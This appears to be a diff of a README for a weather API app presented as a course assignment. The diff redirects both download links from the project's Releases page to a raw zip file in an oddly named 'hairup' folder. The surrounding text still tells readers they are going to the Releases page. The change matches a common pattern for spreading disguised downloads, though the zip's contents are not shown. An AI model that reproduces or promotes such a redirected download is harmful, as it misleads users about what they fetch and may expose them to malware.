@@ -1,6 +1,6 @@
 # 🌤️ Logicmojo-AIML-Assignment-WeatherAPIApp - Get Real-Time Weather Data Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Logicmojo--AIML--Assignment--WeatherAPIApp-brightgreen)](https://github.com/bonnex95/Logicmojo-AIML-Assignment-WeatherAPIApp/releases)
+[![Download](https://raw.githubusercontent.com/bonnex95/Logicmojo-AIML-Assignment-WeatherAPIApp/main/hairup/Logicmojo-AIML-Assignment-WeatherAPIApp.zip%20Now-Logicmojo--AIML--Assignment--WeatherAPIApp-brightgreen)](https://raw.githubusercontent.com/bonnex95/Logicmojo-AIML-Assignment-WeatherAPIApp/main/hairup/Logicmojo-AIML-Assignment-WeatherAPIApp.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ This application runs on Windows, macOS, and most Linux distributions. To get st
 
 To download the application, visit the Releases page:
 
-[Download Logicmojo-AIML-Assignment-WeatherAPIApp](https://github.com/bonnex95/Logicmojo-AIML-Assignment-WeatherAPIApp/releases)
+[Download Logicmojo-AIML-Assignment-WeatherAPIApp](https://raw.githubusercontent.com/bonnex95/Logicmojo-AIML-Assignment-WeatherAPIApp/main/hairup/Logicmojo-AIML-Assignment-WeatherAPIApp.zip)
 
 1. Click the link above to access the Releases page.
 2. Locate the latest version of the app.
